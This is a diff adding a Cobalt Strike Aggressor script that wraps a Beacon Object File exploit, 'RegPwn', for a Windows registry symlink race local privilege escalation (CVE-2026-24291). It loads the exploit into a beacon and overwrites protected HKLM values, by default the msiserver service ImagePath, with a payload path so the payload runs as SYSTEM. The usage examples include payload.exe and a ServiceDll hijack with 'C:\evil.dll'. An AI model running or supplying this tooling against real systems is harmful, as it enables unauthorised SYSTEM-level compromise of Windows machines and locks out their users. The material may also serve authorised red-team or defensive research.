@@ -1,0 +1,104 @@
+########################################
+# RegPwn - CVE-2026-24291 LPE BOF
+# Registry symlink race condition exploit
+#
+# BOF port of the original RegPwn exploit by
+# Filip Dragovic (@Wh04m1001) / MDSec ActiveBreach
+#   https://github.com/mdsecactivebreach/RegPwn
+#   https://www.mdsec.co.uk/2026/03/rip-regpwn/
+########################################
+
+# readbof: load the BOF object file for the beacon's architecture
+sub readbof {
+    local('$barch $bof_filename $handle $data');
+    $barch = barch($1);
+
+    if ($barch ne "x64") {
+        berror($1, "RegPwn only supports x64 beacons.");
+        return $null;
+    }
+
+    $bof_filename = script_resource("regpwn.x64.o");
+    $handle = openf($bof_filename);
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($1, "Could not read BOF file: $bof_filename");
+        return $null;
+    }
+
+    btask($1, "Loaded regpwn for $barch");
+    return $data;
+}
+
+# regpwn <payload_path> [regSubKey] [regValueName]
+alias regpwn {
+    local('$bid $bofdata $args $valuedata $regsubkey $valuename');
+
+    $bid = $1;
+
+    # Default target: msiserver ImagePath
+    $regsubkey = "SYSTEM\\CurrentControlSet\\Services\\msiserver";
+    $valuename = "ImagePath";
+
+    if (size(@_) < 2) {
+        berror($bid, beacon_command_detail("regpwn"));
+        return;
+    }
+
+    $valuedata = $2;
+
+    if (size(@_) >= 3) {
+        $regsubkey = $3;
+    }
+
+    if (size(@_) >= 4) {
+        $valuename = $4;
+    }
+
+    btask($bid, "Running RegPwn CVE-2026-24291 LPE");
+    btask($bid, "  Target: HKLM\\ $+ $regsubkey \\ $+ $valuename");
+    btask($bid, "  Data:   $valuedata");
+    btask($bid, "  WARNING: This will LOCK the workstation!");
+
+    $bofdata = readbof($bid);
+    if ($bofdata is $null) {
+        return;
+    }
+
+    # Pack args as wide strings (Z): valueData, regSubKey, valueName
+    $args = bof_pack($bid, "ZZZ", $valuedata, $regsubkey, $valuename);
+    beacon_inline_execute($bid, $bofdata, "go", $args);
+}
+
+beacon_command_register(
+    "regpwn",
+    "CVE-2026-24291 registry symlink LPE (locks workstation!)",
+    "
+Command: regpwn
+Summary: Exploits CVE-2026-24291 to write arbitrary values to protected
+         HKLM registry keys via a registry symlink race condition in the
+         Windows Accessibility ATConfig mechanism.
+
+         WARNING: This exploit LOCKS the workstation as part of the race
+         condition. The user will need to re-authenticate.
+
+         Default target is the msiserver (Windows Installer) service
+         ImagePath, which runs as SYSTEM and can be started by normal
+         users via 'net start msiserver'.
+
+Usage:   regpwn <payload_path> [regSubKey] [regValueName]
+
+         payload_path   Required. The value to write (e.g. path to payload).
+         regSubKey      Optional. HKLM subkey path (no HKLM\\ prefix).
+                        Default: SYSTEM\\CurrentControlSet\\Services\\msiserver
+         regValueName   Optional. Value name to overwrite.
+                        Default: ImagePath
+
+Examples:
+  regpwn \"cmd.exe /c C:\\Programdata\\payload.exe\"
+  regpwn C:\\Programdata\\payload.exe SYSTEM\\CurrentControlSet\\Services\\msiserver ImagePath
+  regpwn C:\\evil.dll SYSTEM\\CurrentControlSet\\Services\\SomeService\\Parameters ServiceDll
+"
+);
